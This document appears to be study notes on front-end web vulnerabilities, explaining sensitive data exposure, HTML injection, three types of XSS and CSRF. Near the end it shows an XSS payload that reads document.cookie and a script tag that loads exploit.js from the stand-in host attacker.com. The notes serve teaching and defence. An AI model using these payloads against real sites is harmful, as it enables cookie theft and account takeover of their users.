# Front End Vulnerabilities

## Sensitive Data Exposure

It refers to the availability of sensitive data in clear-text to the end-user.

Sometimes we can find **credentials, hashes**, or other sensitive data hidden in the components of a web page's source code or within external JavaScript code being imported.

## HTML Injection

Some user input will not make it to the backend and is processed and redered in the frontent. So, it's critical to validate and sanitize in front and backend as well.

**HTML Injection** happens when unfiltered user input is displayed on the page.

So, when a user has complete control of how their input is displayed, the user can provide html code, and the browser will display it as part of the page.

This can contain then malicious HTML code, like an external login form, etc.

## Cross-Site Scripting (XSS)
HTML Injection can be utilized sometimes to inject `JavaScript` code, thus performing **Cross-Site Scripting**.

So, this means that if we can execute code on the victim's machine, potentially we can access it's account or even their machine.

There are three types of XSS:
- **Reflected XSS** (When user input is displayed on the page after processing (e.g. search result or error message)).
- **Stored XSS** (When user input is stored on backend database, and then displayed upon retrieval, like posts or comments).
- **DOM XSS** (When user input is directly shown in the browser and written to an HTML DOM object like a vulnerable username or page title).

An example could be injecting the following JavaScript code when the input is not validated:

```js
<img src=/ onerror=alert(document.cookie)>
```

## Cross-Site Request Forgery (CSRF)

This attack may utilize the XSS vulnerability to perform certain queries, and API calls on a web app that the victim is authenticated to.

This allows the attacker to perform actions as the authenticated user.

An example is to craft a JS payload that changes the victim's password, and once the victim views the payload on the vulnerable page, like a comment containing the JS CSRF payload, the JS would execute automatically.

So, by using the victim's logged-in session it will change the password.

We can also load a remote javascript file:

```html
<script src=//www.attacker.com/exploit.js></script>
```
